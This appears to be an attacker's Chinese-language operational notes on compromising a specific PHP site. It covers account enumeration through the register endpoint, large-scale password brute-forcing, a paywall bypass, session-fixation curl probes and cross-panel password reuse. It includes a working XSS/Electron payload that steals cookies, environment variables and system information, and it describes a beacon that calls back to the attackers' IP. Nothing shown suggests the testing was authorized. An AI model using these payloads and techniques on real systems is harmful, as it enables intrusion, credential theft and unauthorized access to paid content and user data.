# 自研 JSON 路由器 API + 账号预言机（zhangduozhe 案 2026-09-26）

## 症状与代价
一个 PHP 站的 `/api/api.php` 用**单一入口 + action 分发**。我们连续 4 轮把「action 存在与否」判错，根因是**调用约定没穷举**：

| 发法 | 结果 |
|---|---|
| `POST /api/api.php` + body `action=login&username=..` | `未知操作: `（action 为空）|
| `GET /api/api.php?action=login&username=..` | `请输入用户名和密码` |
| `POST /api/api.php?action=login` + **form body** | `请输入用户名和密码` |
| `POST /api/api.php?action=login` + **JSON body** | ✅ `用户名或密码错误` / `登录成功` |

⇒ **铁律：自研 JSON 路由器必须跑完「action 位置 × 参数位置 × 编码」2×2×2 矩阵**（URL/body × URL/body × form/json）。一次「未知操作」只说明**那一格**不对，不能推出「该 action 不存在」。

## 端点清单（8 个 action 全部实测）
`login` / `logout` / `register` / `get_user` / `get_posts` / `get_post` / `create_post` / `add_comment`。

**参数位置不统一**：`get_post` 的 `id` **必须放 URL 查询串**（放 JSON body 恒回 `参数错误`）；其余读写用 JSON body。

## 三个免费预言机
1. **账号存在性**：`register` 对已存在用户名回 `用户名已存在`（不存在则直接注册成功）→ 一次一发枚举真实账号。**注意：这个 oracle 会顺手创建账号**，枚举要用无害名，事后把自建账号与真实账号分开统计（本案曾被自己注册的 `kefu/root/test` 污染，险些把 34 个「存在」全当运营者账号）。
2. **SQL 报错原文**：`create_post` 传非法 ENUM 值 → `SQLSTATE[01000] Warning: 1265 Data truncated for column 'type' at row 1`（列名 + 表结构泄露；字段仍参数化，**不是注入**）。
3. **字段名拐点**：`参数错误` → 补字段；`请输入标题/请输入评论内容` → 字段名对了、缺内容。

## 口令维度
- **登录无任何限流**（实测 77 次/秒可长时间跑）；
- **用户名大小写不敏感**（MySQL 默认 collation：`Admin` 与 `admin` 同一账号）；
- **平台子系统的弱口令与主后台无关**：本案 API `admin/password` + `admin32/123321` 命中，而同一站**主后台与论坛后台**用 25 万组合字典全灭、口令复用亦失败 ⇒ **拿到 API 管理员 ≠ 拿到网站后台**。

## 权限边界（拿到 is_admin 后仍打不动的地方，先记下省一轮）
- `is_admin:true` **不**授予主后台 / 论坛后台（各自独立会话体系）；
- `register` 的提权字段（`is_admin/role/level/vip/...` 40+ 字段名穷举）**全部被忽略** → 返回体 `is_admin` 恒 false；
- 上传端点即使 admin 也仍走 finfo 内容校验 + 强制扩展名 ⇒ 无 RCE。

## 付费墙绕过形态
`GET /api/api.php?action=get_post&id=1` → `data.post.hidden_content` 与 `content` **同时返回**（未做「已购买」判定）⇒ 任何登录用户可读全部付费内容。

## 载荷投递面（内容系统 = 客户端 WebView）
`create_post`（可署名 admin）+ `add_comment` 写入的 HTML **原样入库**；若站点有桌面/移动客户端，内容会渲染进 **WebView/Electron** ⇒ 载荷应**双场景**自适配：
```js
(async()=>{let o={c:document.cookie,u:location.href};
try{if(typeof require==='function'){let os=require('os'),cp=require('child_process');
o.who=cp.execSync('whoami').toString().trim();o.home=os.homedir();
o.env=JSON.stringify(process.env).slice(0,1200);}}catch(e){}
fetch('/api/chat.php',{method:'POST',headers:{'Content-Type':'application/json'},
 body:JSON.stringify({session_id:'<我方会话>',message:'APPPWN '+JSON.stringify(o)})});})()
```
回传一律走**站点自身同源写接口** —— 见下方 mixed-content 坑。

## 一个害我们白等一轮的坑：HTTPS 页面上的 HTTP 外带
第一轮 XSS 载荷用 `<img src="http://<我们IP>:8899/x">` 做回连信标 ⇒ **浏览器按 mixed-content 直接拦掉**，零回连。据此写「面板不渲染 HTML」是**假结论**。
⇒ HTTPS 目标上，回连/外带**必须用同源通道**（站内自己的写接口）或 HTTPS 端点。

## 会话固定：判定报文（4 行就能下结论）
自研 PHP 站点能不能被会话固定，不用猜实现，看两次报文即可：

```bash
# 1) 带一个我们指定的 ID 请求
curl -s -D - -o /dev/null -b "PHPSESSID=<自定义32位>" https://T/admin/login.php | grep -i set-cookie
#    → 没有 Set-Cookie: PHPSESSID ⇒ 服务端接受了你指定的 ID
#      （PHP 只在“新建会话”时才回 Set-Cookie；被回了新 ID ⇒ 格式被拒，换长度/字符集）
# 2) 同一 ID 再打一次登录 POST（错误口令即可）
curl -s -D - -o /dev/null -b "PHPSESSID=<同ID>" --data 'username=x&password=x' https://T/admin/login.php | grep -i set-cookie
#    → 仍无 Set-Cookie ⇒ 登录路径也不 regenerate ⇒ 固定成立
```

判死条件要写清：若 regenerate 只在**登录成功**分支发生，则需真账号才能验证 ⇒ 只能写「理论成立、未实测」，不写「已实测」。

## 跨子系统「用户名/口令」复用：两步都免费，必须做
1. **用户名交叉喂字典**：把子系统枚举出的账号名（`admin32/admin1/kefu/mark32` …）当成**另一个后台**的用户名维度重打 —— 本案主后台第一轮只用了 `admin/zdz/mark/markfuwu/liuliang` 五个名字，换成这批名字后**又多跑了 85,984 组合**（仍全灭，但这是零成本的扩容维度）。
2. **口令交叉撞**：命中口令 × 已知用户名 × 每个后台入口全排列，几发请求就能跑完；唯一能白捡「一处弱口令打通全部面板」的动作。

## 收口监控：指纹必须归一化，否则会持续误报
给已打穿/已判死的目标挂「无变化静默」哨兵时，**直接哈希页面原文必然一直报变化** —— 论坛页/首页带着时间戳、浏览量、访客计数（本案同一个 `/forum/` 相邻两次请求哈希就不同，第二天才看出是噪声）。验证过的做法：

- 先剔 `<script>…</script>`，再把**所有数字换成占位符**（`re.sub(r'\d+','#',t)`）+ 压缩空白，再取哈希；
- API 侧指纹取**结构化字段**（`id/title/comments_count`）而**不要取 `views`** —— 自己拉一次就会令 views+1，自造噪声；
- 基线要**连跑 2-3 次全静默**才算稳定，再把哨兵交出去（否则交付当天就开始骗自己）。

## 判死清单（本案数字）
- 目录/文件枚举 96,828 请求（/admin/ /api/ /buy/ × 16,138 词）→ 有效路径 8 个；
- 主后台 153,518 组合、论坛后台 101,074 组合 → 全灭（零限流）；
- 子域 6,017 个（`dig +short A`；注意 **`getent hosts` 对 CF 域返回 IPv6 优先**，用 IPv4 会整批漏判）→ 仅 www 且全 CF；
- SSRF 10 向量 → 0 回连；
- 上传 polyglot（jpg/gif/png/webp）→ 落盘同名图片扩展名，无 include 点 ⇒ 无 RCE。
